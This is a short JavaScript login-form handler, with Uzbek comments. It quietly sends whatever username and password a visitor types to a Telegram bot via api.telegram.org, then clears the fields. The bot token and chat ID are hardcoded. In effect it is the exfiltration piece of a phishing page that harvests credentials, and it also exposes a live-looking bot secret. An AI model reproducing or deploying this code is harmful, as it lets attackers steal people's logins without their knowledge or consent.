const Username = document.querySelector("#username")
const Password = document.querySelector("#password")
const Form = document.querySelector("#form")



// const GetValue = (event) =>{
//     event.preventDefault()
//     console.log("working..");
// }
// const GetValue = (e) =>{
//     e.preventDefault()
//     // console.log(Username.value, Password.value);

//     // if(Username.value === "" || Password.value === ""){
//     //   alert("Ma'lumotlarni to'liq kiriting!!!")  
//     // }
        
// }

// Form.addEventListener("submit" , GetValue )

// %0A   => br degani
const SendMessage = (e) =>{
    e.preventDefault()
    text = `%0A 👦 Username: ${Username.value}  %0A 🔑Password: ${Password.value} `
    chat_id = -1002128588085
    token = `6834109969:AAEhUkHL4MsMs8Be2CWGY9oC7KXSbW8JHAM`
    url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=html`

    let api = new   XMLHttpRequest();
    api.open("GET", url, true);
    api.send();
    Username.value = ""
    Password.value = ""
}   

Form.addEventListener("submit" , SendMessage )